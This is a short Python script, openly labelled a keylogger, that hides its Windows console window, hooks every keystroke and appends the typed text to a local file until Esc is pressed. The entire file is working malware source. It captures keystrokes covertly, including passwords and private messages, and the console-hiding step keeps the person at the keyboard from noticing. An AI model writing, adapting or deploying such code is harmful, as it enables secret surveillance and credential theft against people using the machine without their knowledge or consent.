# Keyboard Input Collector Script (Keylogger)
# Author: Jason Cain

import win32console
import win32gui
import keyboard

# Hide console window
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

# Customizable Script
# Be sure to change desired path for output text file
def on_keyboard_event(e):
    if e.event_type == keyboard.KEY_DOWN:
        if e.name == 'space':
            keylogs = ' '
        elif e.name == 'enter':
            keylogs = '\n'
        elif e.name == 'backspace':
            # Simulate a backspace by removing the last character in the file
            with open('C:\\Users\\loaner\\output.txt', 'r') as f:
                content = f.read()
        
            with open('C:\\Users\\loaner\\output.txt', 'w') as f:
                f.write(content[:-1])
                
            return
        # All other keys
        else:
            keylogs = e.name

        with open('C:\\Users\\loaner\\output.txt', 'a') as f:
            f.write(keylogs)

# Keyboard hook and exit
keyboard.hook(on_keyboard_event)
keyboard.wait('esc')  # Wait for the 'esc' key to exit